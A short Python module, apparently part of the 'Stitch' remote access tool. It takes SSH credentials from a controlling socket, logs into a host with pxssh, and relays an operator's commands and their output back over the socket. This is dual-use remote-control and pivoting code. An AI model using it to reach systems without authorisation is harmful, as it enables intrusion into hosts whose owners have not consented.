# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import pexpect.pxssh

def run_ssh_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    return str(s.before)

def ssh_connect(host, user, password):
    try:
        s = pexpect.pxssh.pxssh()
        s.login(host, user, password)
        return s, True
    except Exception as e:
        return '[!] SSH Failure: {}'.format(str(e)), False

ssh_user = receive(client_socket)
ssh_hostname = receive(client_socket)
ssh_password = receive(client_socket)

s, success = ssh_connect(ssh_hostname, ssh_user, ssh_password)
if success:
    prompt = "{}@{}>> ".format(ssh_user,ssh_hostname)
    send(client_socket, prompt)
    while True:
        ssh_cmd = receive(client_socket)
        if ssh_cmd.startswith('exit'): break
        ssh_resp = run_ssh_command(s, ssh_cmd.strip())
        send(client_socket,ssh_resp)
    s.logout()
else:
    send(client_socket,s)
